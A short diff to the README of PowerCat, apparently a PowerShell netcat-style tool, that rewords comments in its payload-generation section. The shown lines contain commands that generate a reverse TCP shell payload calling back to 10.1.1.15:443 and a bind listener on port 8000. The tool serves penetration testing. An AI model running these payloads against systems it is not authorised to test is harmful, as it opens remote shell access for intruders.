@@ -106,10 +106,10 @@ Generate Payloads
 Payloads can be generated using the New-PowerCatPayload function. 
 ###
 ```powershell
-    # Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
+    # Generate a reverse tcp payload that connects back to 10.1.1.15 port 443:
     New-PowerCatPayload -RemoteIp 10.1.1.15 -Port 443 -Execute 
         
-    # Generate a bind tcp encoded command which listens on port 8000:
+    # Generate a tcp payload that listens on port 8000:
     New-PowerCatPayload -Listener -Port 8000 -Execute
 ```
 Misc Usage
